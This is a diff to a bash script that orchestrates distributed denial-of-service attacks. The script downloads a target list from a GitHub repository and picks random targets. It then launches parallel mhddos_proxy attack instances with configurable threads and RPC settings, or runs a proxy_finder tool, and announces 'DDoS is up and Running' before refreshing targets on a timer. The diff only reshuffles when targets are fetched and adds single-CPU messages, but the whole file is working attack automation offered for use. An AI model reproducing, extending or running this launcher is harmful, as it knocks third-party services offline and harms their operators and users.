@@ -141,13 +141,7 @@ then
 	fi
 fi
 
-if ((rand == 2));
-then
-	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting attack with such parameters: $num_of_copies parallel atack(s) -t $threads --rpc $rpc $debug...\033[1;0m"
-else
-	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting proxy_finder...\033[1;0m"
-fi
-sleep 5s
+
 
 
 
@@ -201,26 +195,27 @@ do
 	fi
 	#
    	sleep 3s
-		
-   	list_size=$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]" | wc -l)
-	
-	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Number of targets in list: " $list_size "\n"
-   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Taking random targets (just not all) to reduce the load on your CPU(processor)..."
-	
-   		
-	if ((num_of_copies > list_size));
-	then 
-		random_numbers=$(shuf -i 1-$list_size -n $list_size)
-	else
-		random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
-	fi
-	
-		
-	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Random number(s): " $random_numbers "\n"
 	
 	if ((rand == 2));
 	then
-   		# Launch multiple mhddos_proxy instances with different targets.
+   		list_size=$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]" | wc -l)
+	
+		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Number of targets in list: " $list_size "\n"
+   		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Taking random targets (just not all) to reduce the load on your CPU(processor)..."
+	
+		if ((num_of_copies > list_size));
+		then 
+			random_numbers=$(shuf -i 1-$list_size -n $list_size)
+		else
+			random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
+		fi
+	
+		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Random number(s): " $random_numbers "\n"
+		
+		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only 1 CPU, so for next 20 minutes will be started only mhddos_proxy (without proxy_finder)\033[0;0m\n"
+		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting attack with such parameters: $num_of_copies parallel atack(s) -t $threads --rpc $rpc $debug...\033[1;0m"
+		sleep 3s
+		# Launch multiple mhddos_proxy instances with different targets.
    		for i in $random_numbers
    		do
             		echo -e "\n I = $i"
@@ -238,9 +233,10 @@ do
             		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
    		done
    		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
-   		sleep 5s
 	else
-		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mStarting our new proxy_finder, next restart in $restart_interval...\033[1;0m"
+		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only 1 CPU, so for next 20 minutes will be started only proxy_finder (without mhddos_proxy)\033[0;0m\n"
+		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting proxy_finder...\033[1;0m"
+		sleep 3s
 		cd ~/proxy_finder
 		python3 finder.py&
 	fi
